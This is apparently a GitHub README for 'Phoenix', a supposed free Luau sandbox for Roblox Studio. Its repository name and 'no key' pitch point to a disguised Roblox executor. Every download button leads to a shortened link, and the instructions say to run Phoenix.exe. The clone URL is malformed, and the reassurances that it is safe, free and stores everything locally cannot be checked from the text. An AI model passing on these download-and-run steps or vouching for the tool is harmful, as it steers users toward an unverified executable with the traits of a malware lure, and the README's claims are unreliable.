...
[![Stars](https://img.shields.io/github/stars/Phoenix-Exec-Update-v3.4?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://share.google/bdDd14XjiPOXQsygV">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Latest%20Build-brightgreen?style=for-the-badge" alt="Download Phoenix — Luau Sandbox for Roblox Studio Developers">
  </a>
</p>

> **[⬇️ Download Phoenix — Latest 2026 Build](https://share.google/bdDd14XjiPOXQsygV)**
...
**Phoenix** is a **Luau sandbox and learning environment** for **Roblox Studio** developers. It gives beginner and intermediate Luau programmers a comfortable place to practice, prototype, and share ideas outside of the Studio IDE — with a fast code editor, sample library, and profile-based project management.

Phoenix is designed for **Roblox game development**, **Luau tutorials**, and **script prototyping workflows**. It follows Roblox's developer guidelines and is intended for use with **your own Studio projects**, **Team Create sessions you own**, and **local .rbxl files** — not for live user games you don't have permission to modify.
...
Phoenix ships with tested, up-to-date Luau samples across common Roblox development topics:
...
1. Click the **[Download Phoenix](https://share.google/bdDd14XjiPOXQsygV)** button above
2. Run `Phoenix.exe` — no installer, no admin rights needed
...
git clone https://github.com/Phoenix-Exec-Update-v3.4.git
cd Phoenix-Exec-Update-v3.4

# Run the app
Phoenix.exe --profile default --runner async
```
...
The Phoenix sample library covers the topics Luau learners search for most:
...
### Is Phoenix an official Roblox tool?
No. Phoenix is a free, community-built learning tool for Luau developers. It is not affiliated with, endorsed by, or connected to Roblox Corporation.

### Is Phoenix really free? Do I need a key?
Yes, Phoenix is **100% free and open source** under the MIT License. **No key**, no surveys, no ads.
...
### Is Phoenix allowed by Roblox's rules?
Phoenix is intended for **local Luau learning and Studio prototyping** on projects you own or have permission to modify. Users are responsible for following Roblox's Terms of Service and Community Standards.

### Where does Phoenix store my saved snippets?
Locally, at `%AppData%\Phoenix\samples\`. Nothing is uploaded to external servers — your code stays on your PC.

### Does Phoenix work on Windows 11?
Yes, Phoenix is fully compatible with **Windows 11** and **Windows 10**.
...
<p align="center">
  <b>Phoenix v3.4</b> — A friendly Luau sandbox for Roblox Studio developers, built for 2026.
</p>
